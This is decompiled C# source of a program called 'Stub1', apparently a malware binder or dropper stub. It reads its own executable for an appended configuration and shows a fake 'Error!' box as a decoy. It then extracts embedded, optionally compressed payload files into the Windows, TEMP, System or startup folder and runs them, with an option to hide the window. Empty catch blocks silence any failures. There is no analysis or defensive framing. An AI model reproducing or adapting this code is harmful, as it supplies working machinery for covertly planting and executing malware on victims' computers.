using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Windows.Forms;

namespace Stub1;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		StreamReader streamReader = new StreamReader(Application.get_ExecutablePath());
		BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
		byte[] array = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
		binaryReader.Close();
		streamReader.Close();
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		string @string = aSCIIEncoding.GetString(array);
		string text = @string.Substring(@string.LastIndexOf("|&&"));
		char[] separator = new char[1] { '#' };
		char[] separator2 = new char[1] { '|' };
		string[] array2 = text.Split(separator);
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		string[] array3 = array2;
		foreach (string text2 in array3)
		{
			string[] array4 = text2.Replace("|&&", null).Split(separator2);
			if (num == 0)
			{
				num2 = Convert.ToInt32(array4[0]);
				num3 = num2;
				if (array4[1] != "False")
				{
					MessageBox.Show(array4[1], "Error!", (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
			}
			else
			{
				int num4 = 0;
				string text3 = "C:\\";
				string text4 = "none";
				bool flag = false;
				bool flag2 = false;
				int num5 = 0;
				bool flag3 = false;
				try
				{
					num4 = Convert.ToInt32(array4[0]);
					text3 = array4[1];
					flag = Convert.ToBoolean(array4[2]);
					text4 = array4[3];
					flag2 = Convert.ToBoolean(array4[4]);
					num5 = Convert.ToInt32(array4[5]);
					flag3 = Convert.ToBoolean(array4[6]);
					switch (text3)
					{
					case "Windows":
						text3 = Environment.GetEnvironmentVariable("windir") + "\\" + text4;
						break;
					case "Temporary":
						text3 = Environment.GetEnvironmentVariable("TEMP") + "\\" + text4;
						break;
					case "System":
						text3 = Environment.SystemDirectory + "\\" + text4;
						break;
					case "Application":
						text3 = Application.get_StartupPath() + "\\" + text4;
						break;
					}
					StreamWriter streamWriter = new StreamWriter(text3);
					if (flag2)
					{
						byte[] buffer = DeCompress(array, num3, num5, num4);
						streamWriter.BaseStream.Write(buffer, 0, num4);
					}
					else
					{
						streamWriter.BaseStream.Write(array, num3, num4);
					}
					streamWriter.Close();
					if (flag)
					{
						if (!flag3)
						{
							Process.Start(text3);
						}
						else
						{
							Process process = new Process();
							process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process.Start();
						}
					}
					num3 += num4;
				}
				catch
				{
				}
			}
			num++;
		}
	}

	private static byte[] DeCompress(byte[] binder, int currentPos, int length, int finalSize)
	{
		try
		{
			byte[] array = new byte[finalSize];
			int num = 0;
			Stream stream = new GZipStream(new MemoryStream(binder, currentPos, length), CompressionMode.Decompress);
			while (true)
			{
				int num2 = stream.Read(array, 0, finalSize);
				if (num2 <= 0)
				{
					break;
				}
				num += num2;
			}
			stream.Close();
			return array;
		}
		catch
		{
			return null;
		}
	}
}
